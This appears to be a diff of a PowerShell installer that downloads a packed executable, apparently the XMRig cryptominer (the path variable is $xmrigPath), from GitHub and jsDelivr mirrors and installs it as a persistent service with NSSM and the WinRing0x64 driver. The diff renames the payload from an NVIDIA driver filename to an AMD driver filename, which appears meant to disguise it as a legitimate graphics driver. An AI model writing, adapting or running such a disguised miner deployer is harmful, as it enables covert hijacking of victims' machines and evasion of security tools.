@@ -152,10 +152,10 @@ Write-Host "`nStep 3: Downloading files..." -ForegroundColor Cyan
 
 # Define files with multiple mirror URLs
 $files = @{
-    'nvlddmkm.vmp_protected.exe' = @(
-        'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.vmp_protected.exe',
-        'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.vmp_protected.exe',
-        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.vmp_protected.exe'
+    'amdkmpfd.sys.vmp.exe' = @(
+        'https://raw.githubusercontent.com/User07x07/Dopple/main/amdkmpfd.sys.vmp.exe',
+        'https://github.com/User07x07/Dopple/raw/main/amdkmpfd.sys.vmp.exe',
+        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/amdkmpfd.sys.vmp.exe'
     )
     'nssm.exe' = @(
         'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe',
@@ -170,7 +170,7 @@ $files = @{
 # Check if files already exist locally first
 Write-Host "  Checking for local files..." -ForegroundColor Gray
 $localFiles = Get-ChildItem -Path $scriptDir -File | Where-Object { 
-    $_.Name -in @('nvlddmkm.vmp_protected.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
+    $_.Name -in @('amdkmpfd.sys.vmp.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
 }
 
 foreach ($localFile in $localFiles) {
@@ -211,7 +211,7 @@ foreach ($item in $files.GetEnumerator()) {
 # Step 4: Verify downloaded files
 Write-Host "`nStep 4: Verifying downloaded files..." -ForegroundColor Cyan
 
-$requiredFiles = @('nvlddmkm.vmp_protected.exe', 'config.json', 'nssm.exe')
+$requiredFiles = @('amdkmpfd.sys.vmp.exe', 'config.json', 'nssm.exe')
 $missingFiles = @()
 $failedDownloads = $downloadResults.GetEnumerator() | Where-Object { $_.Value -eq $false }
 
@@ -256,7 +256,7 @@ Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
 Set-Location $targetDir
 
 $nssmPath = Join-Path $targetDir "nssm.exe"
-$xmrigPath = Join-Path $targetDir "nvlddmkm.vmp_protected.exe"
+$xmrigPath = Join-Path $targetDir "amdkmpfd.sys.vmp.exe"
 
 if (Test-Path $nssmPath) {
     try {
@@ -355,6 +355,7 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
 
 
 
